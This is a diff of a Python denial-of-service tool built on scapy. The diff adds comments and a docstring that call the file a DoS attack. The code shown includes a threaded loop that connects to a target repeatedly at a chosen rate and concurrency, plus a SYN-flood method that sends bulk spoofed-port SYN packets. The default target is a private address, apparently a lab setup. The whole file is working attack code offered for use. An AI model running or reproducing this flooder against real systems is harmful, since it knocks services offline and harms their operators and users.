@@ -5,9 +5,13 @@ import argparse
 import threading
 from scapy.all import IP, TCP, Raw, send, RandShort
 
-
+"""
+This file is used for a denial of service based attack.
+Currently attempts to connnect continuously and sends a small data packet.
+"""
 
 class DoS:
+    # Initializes target ip, ports, mode, requests per second and concurrency
     def __init__(self, target_ip, ports, mode, requestsPerSecond, concurrency):
         self.target_ip = target_ip
         self.ports = ports
@@ -17,6 +21,7 @@ class DoS:
         self.stop = threading.Event()
 
 
+    # Attempts to connect
     def connect(self, port):
 
         try:
@@ -31,7 +36,7 @@ class DoS:
         except Exception:
             pass
 
-
+    # Loops until connect
     def connect_loop(self):
         interval = 0.0
         if self.requestsPerSecond > 0:
@@ -43,7 +48,7 @@ class DoS:
             if interval:
                 time.sleep(interval)
 
-    # test later
+    # test later, not yet used
     def syn_flood(self, port, count):
         ip = IP(dst = self.target_ip)
         tcp = TCP(sport = RandShort(), dport = port, flags = "S")
@@ -52,7 +57,7 @@ class DoS:
         send(p, count=count, verbose = 0)
 
 
-
+    # Runs the DoS attack
     def run(self, duration):
         print(f"mode={self.mode} target={self.target_ip} ports={self.ports} requestsPerSecond={self.requestsPerSecond} concurrency={self.concurrency} duration={duration}s")
         threads = []
@@ -79,7 +84,7 @@ class DoS:
 def parse_ports(s):
     return [int(x) for x in s.split(",") if x.strip()]
 
-
+# main function
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--target", default="192.168.1.65")
